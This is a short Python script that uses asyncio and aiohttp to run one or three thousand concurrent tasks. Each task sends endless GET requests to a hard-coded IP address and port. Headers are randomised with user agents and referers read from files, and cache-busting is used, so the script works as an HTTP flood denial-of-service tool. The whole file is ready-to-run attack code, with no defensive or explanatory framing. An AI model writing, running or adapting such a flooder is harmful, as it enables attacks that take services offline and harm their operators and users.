import asyncio
import os
import random
import aiohttp
def initialize_resources():
 with open("res/referers.txt")as referers:
  with open("res/useragents.txt")as user_agents:
   return referers.readlines(),user_agents.readlines()
referers,user_agents=initialize_resources()
async def run(url:str,task_id:int):
 async with aiohttp.ClientSession()as session:
  while True:
   try:
    await session.get(url,headers={"User-Agent":random.choice(user_agents).strip(),"Cache-Control":"no-cache","Accept-Charset":"ISO-8859-1,utf-8;q=0.7,*;q=0.7","Referer":random.choice(referers).strip()+url,"Keep-Alive":str(random.randint(110,120)),"Connection":"keep-alive",},)
   except Exception as e:
    print(f"Exception in task {task_id}: {e.__class__.__name__}: {e}")
def main():
 tasks=3000 if "PORT" in os.environ else 1000
 url="http://207.148.80.115:8123/"
 loop=asyncio.get_event_loop()
 for i in range(tasks):
  loop.create_task(run(url,i))
 loop.run_forever()
if __name__=="__main__":
 main()
